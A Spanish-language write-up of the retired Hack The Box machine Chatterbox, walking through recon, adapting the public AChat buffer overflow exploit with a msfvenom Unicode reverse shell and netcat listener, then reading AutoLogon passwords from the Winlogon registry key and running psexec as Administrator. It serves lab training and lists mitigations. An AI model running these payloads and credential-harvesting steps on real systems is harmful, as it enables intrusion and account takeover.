---
machine: Chatterbox
os: Windows
difficulty: Medium
platform: Hack The Box
category: Servicios / Windows
state: Retired
tags: [windows, buffer-overflow, achat, edb-36025, autologon, psexec]
---

# Chatterbox — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El servicio interesante no es SMB: son dos puertos raros (**9255/9256**) que resultan ser **AChat 0.150 beta7**, con un *buffer overflow* público (EDB 36025). La dificultad está en que el *payload* debe sobrevivir a la conversión **Unicode** del protocolo. La shell cae como `alfred`, y en el registro, en `Winlogon`, hay credenciales **AutoLogon en claro** que también sirven para `Administrator`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 SP1
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
```

SMB no lleva a nada; el nombre de la máquina y los puertos 9255/9256 apuntan al chat.

```bash
searchsploit achat
# Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

## Acceso

1. **Adaptar el exploit**: el original abre `calc.exe`. Se genera una shell inversa **compatible con Unicode** (el protocolo mete cada byte en un `WORD`, así que los bytes `0x00` y los que se interpretan como *bad chars* hay que evitarlos):

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=<IP> LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f' \
  BufferRegister=EAX -f python
```

2. **Lanzar el exploit** apuntando al 9256, con el *shellcode* sustituido y el listener en marcha:

```bash
nc -lvnp 443
python2 36025.py <IP>
```

```text
C:\Users\alfred\Desktop> whoami
chatterbox\alfred
```

## Escalada

1. **Credenciales en el registro** (AutoLogon):

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName
```

Devuelve `Alfred` y su contraseña **en claro**. Esa misma contraseña funciona para `Administrator`.

2. **Ejecutar como administrador**:

```bash
psexec.py Administrator:'<password>'@<IP>
# o
winexe -U 'Administrator%<password>' //<IP> cmd.exe
```

```text
C:\Windows\system32> whoami
nt authority\system
```

## Tropiezos

- **Unicode**: un `shell_reverse_tcp` normal no vale; sin `unicode_mixed` y `BufferRegister=EAX` el proceso muere.
- **Puerto del listener**: el 443 evita bloqueos; con otros puertos el shellcode puede contener bytes problemáticos.
- **Binario del exploit en Python 2**: usa `print` y cadenas de bytes; con Python 3 hay que adaptarlo.
- **`root.txt` con ACL rara**: en algunas versiones del reto el fichero se lee ajustando permisos (`icacls`), pero lo limpio es llegar como `Administrator`.

## Lecciones

- Software de nicho en un lab suele significar exploit público: identificar la versión es medio camino.
- Un desbordamiento con conversión de codificación exige *shellcode* a medida; el *encoder* correcto es la diferencia entre shell y crash.
- `AutoLogon` guarda la contraseña en claro en el registro: es una de las primeras cosas que busca un atacante con shell.
- Mitigación: parchear el servicio, eliminar AutoLogon y no reutilizar contraseñas entre cuentas.
